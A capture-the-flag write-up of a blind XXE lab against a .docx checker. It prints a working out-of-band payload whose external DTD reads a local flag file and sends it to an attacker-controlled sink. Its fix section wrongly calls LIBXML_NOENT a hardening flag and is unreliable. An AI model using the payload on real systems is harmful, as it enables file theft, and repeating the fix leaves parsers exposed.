---
title: "XXE (medium) — out-of-band exfiltration"
category: Web
host: xxe-medium.is-course.ru
tags: [xxe, oob, docx, dtd]
technique: "external DTD, OOB exfiltration through a second request"
status: solved
---

# XXE — out-of-band

## Recon
The "vegan.docx checker" unzips an uploaded OOXML file and parses `word/document.xml` with an XML
parser that resolves external entities (libxml defaults, no `LIBXML_NOENT` hardening). The response
never echoes parsed content, so classic in-band XXE is blind — we need OOB.

## Exploit
1. Craft `evil.docx` whose `word/document.xml` contains:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % remote SYSTEM "https://<sink>/evil.dtd"> %remote; %all; ]>
<r>&exfil;</r>
```

2. `evil.dtd` on our own HTTP sink:

```
<!ENTITY % file SYSTEM "file:///proc/self/cwd/flag.txt">
<!ENTITY % all "<!ENTITY exfil SYSTEM 'https://<sink>/?d=%file;'>">
```

3. The parser fetches the DTD (we see the request), substitutes `%file;` and issues the second request
   with the file contents in the query string.

`/proc/self/cwd/flag.txt` is the reliable path: the flag file is not at a fixed absolute location, but
the process CWD is the app directory.

Flag: `YDS{…redacted…}`

## Fix
Disable external entity resolution (`LIBXML_NOENT`/`XML_PARSE_NONET`), or parse with a hardened
parser (e.g. Go's `encoding/xml` with `Strict` and no DTD support).
